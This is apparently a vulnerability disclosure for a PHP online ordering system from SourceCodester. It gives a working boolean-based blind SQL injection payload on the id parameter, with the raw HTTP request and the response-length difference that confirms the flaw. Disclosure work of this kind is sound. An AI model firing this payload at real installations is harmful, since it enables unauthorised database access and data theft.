# Online Ordering System By janobe has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/index.php?q=products&id=

Vulnerability location: /ordering/index.php?q=products&id= //id is Injection point

[+]Payload: /ordering/index.php?q=products&id=2%27%20and%20length(database())%20=12--+ //id is Injection point

Current database name: multistoredb,length is 12

```sql
GET /ordering/index.php?q=products&id=2%27%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 11, Content-Length: 17564
![image](https://user-images.githubusercontent.com/54017627/168940458-5e11db7e-7a83-4fd9-a205-4c3ded901d1c.png)

![image](https://user-images.githubusercontent.com/54017627/168940395-a8d6777e-8543-4e5d-a333-907517ce3c1e.png)

When length (database ()) = 12, Content-Length: 24330
![image](https://user-images.githubusercontent.com/54017627/168940427-fd0bf7b1-4ddd-44f1-8d75-16d69b55478c.png)

![image](https://user-images.githubusercontent.com/54017627/168940372-79814df9-4d24-443e-a107-0a4c2482f2fa.png)
